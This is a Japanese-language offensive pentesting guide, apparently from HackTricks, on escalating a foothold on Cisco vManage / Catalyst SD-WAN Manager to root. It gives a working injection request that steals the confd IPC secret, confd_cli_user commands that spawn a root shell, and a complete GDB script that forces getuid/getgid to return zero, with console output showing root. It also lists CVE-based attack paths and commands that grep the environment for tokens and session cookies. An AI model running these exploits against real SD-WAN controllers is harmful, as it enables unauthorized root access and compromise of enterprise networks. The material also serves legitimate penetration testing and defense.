# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を得たら、最も興味深い local privesc の対象は通常、`confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs、そして root-owned の import/upload handlers です。

コントローラで **initial foothold** がまだ必要なら、まず専用の control-plane ページを確認してください:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
`/etc/confd/confd_ipc_secret` が foothold から読み取れるなら、Path 1 と Path 2 はすぐに実用的になります。

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` と各種バイナリに関するいくつかの [documentation](http://66.218.245.39/doc/html/rn03re18.html) を少し掘り下げたところ（Cisco website のアカウントでアクセス可能）、IPC socket の認証には `/etc/confd/confd_ipc_secret` にある secret を使っていることが分かりました:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j インスタンスを覚えていますか？ それは `vmanage` ユーザーの権限で動作しているため、前の脆弱性を使ってファイルを取得できます:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。なので、`/usr/bin/confd_cli_user` を自分たちの引数セットで直接呼び出せます。  
ただし、現在の権限では読み取れないため、rootfs から取得して `scp` でコピーし、help を読んで、それを使って shell を取得する必要があります:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv team の blog¹ では root shell を取得する elegant な方法が説明されていましたが、注意点として `/usr/bin/confd_cli_user` のコピーが必要で、これは root だけが読み取り可能です。私は、そこまで面倒な手順を踏まずに root へ privilege escalation する別の方法を見つけました。

`/usr/bin/confd_cli` binary を disassemble したところ、次のことを確認しました。

<details>
<summary>UID/GID collection を示す Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

「ps aux」を実行すると、以下を確認しました（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、「confd_cli」プログラムが、ログイン中ユーザーから取得した user ID と group ID を「cmdptywrapper」アプリケーションに渡していると仮説を立てた。

最初の試みとして、「cmdptywrapper」を直接実行し、`-g 0 -u 0` を指定してみたが、失敗した。途中のどこかで file descriptor (-i 1015) が作成されており、それを偽装できないようだ。

synacktiv の blog（最後の例）で述べられているように、「confd_cli」プログラムは command line argument をサポートしていないが、debugger で影響を与えることはできる。幸い、このシステムには GDB が含まれている。

私は API `getuid` と `getgid` が 0 を返すように強制する GDB script を作成した。deserialization RCE によってすでに「vmanage」privilege を持っているので、`/etc/confd/confd_ipc_secret` を直接読む権限がある。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## パス 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、自社のアドバイザリで [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) に関するよりクリーンな local root パスを文書化した: **read-only 権限しか持たない認証済み attacker** が manager CLI に細工した request を送信し、input validation 不足のために root へ jump できるというものだ。

攻撃的な観点から見ると、重要な takeaway は次のとおり:

1. Box 上で *any* low-priv foothold を取れたら、重い Path 1 / Path 2 の workflow に進む前に local CLI service をテストすべきである。
2. Path 2 の artifacts を再利用して trust boundary を見つける: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend に forwarded されるすべての field を suspicious とみなす: UID/GID、username、terminal metadata、imported files、または後で root-owned helper に consumed される value。
4. low-priv user が local CLI socket に reach でき、これらの field に influence できるなら、root は細工した request 1 回で届く可能性がある。

appliance に landing した後の practical workflow は次のとおり:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは2025年のバグを、同様のバージョン向けの有用なハンティングパターンに変えます: **userlandでidentityを収集し、それをより権限の高いwrapperに渡すlocal CLI shims** を探してください。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Ciscoの2026年2月のadvisoryでも、別の有用なprivescクラスが導入されました: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) は、REST APIの不十分なuser-authentication mechanismにより、**低権限の認証済みローカルattacker** がrootを取得できました。

これは重要です。なぜなら、vManageのprivescはもはや `confd`/TTY abuse に限られないからです。low-priv shellの後は、以下も探してください:

- callerを過度に信頼する localhost-only のAPI endpoints
- 現在のアカウントから読める tokens, cookies, または service credentials
- `dataservice`/REST handlers 経由で公開されている root-only actions で、ローカルからなおトリガー可能なもの

実際には、`vmanage` や別のservice userとしてshellを得たら、local API abuse は interactive CLI abuse よりも静かで自動化しやすいことが多いです:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションのコンテキストだけで privileged な REST 機能に到達できるなら、API パスを優先してください: その方が、盗まれた web セッションや API token と組み合わせて再生、スクリプト化、連鎖させやすいです。

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

最近の別パターンは [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) です: `netadmin` 権限を持つ local attacker が **crafted file** を upload し、後で CLI がそれを unsafe に処理してしまい、`root` としての command injection につながるというものです。

HackTricks の観点では、価値のある technique は特定の CVE よりも広いです:

1. file を受け付けるすべての CLI または web workflow を列挙する: imports, diagnostic bundles, templates, validators, backups, tenant data, など。
2. upload された file がどこに置かれ、どの root-owned script または binary がそれを consume するのかを追跡する。
3. filename, file content, あるいは parsed metadata が shell commands, wrapper scripts, または `system()` スタイルの helper に渡されることがあるかをテストする。
4. すでに `netadmin` に到達できるなら (valid creds, stolen session, or an auth-bypass chain)、file-processing bugs はしばしば root への最短経路です。

この bug class は、`netadmin` は与えるが `root` は与えない remote footholds と特にうまく chain できます。

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – web UI で admin session を盗み、その後 API/CLI actions に pivot して最終的に `vshell` か上記の local privesc paths のいずれかへ到達する。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 2026 crafted-file privesc に必要なレベルがまさに `netadmin` なので、Path 5 の非常に強力な前段になります。
- **Authenticated arbitrary file write (CVE-2026-20262)** – 後で privileged components に parse される file を配置したり、root-owned helpers が consume する operational artifacts を上書きするのに有用です。
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 専用の SD-WAN control-plane ページでより詳しく説明されています; `vmanage-admin` 用の SSH key を append でき、ここを再訪するのに必要な local foothold を得られます。

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
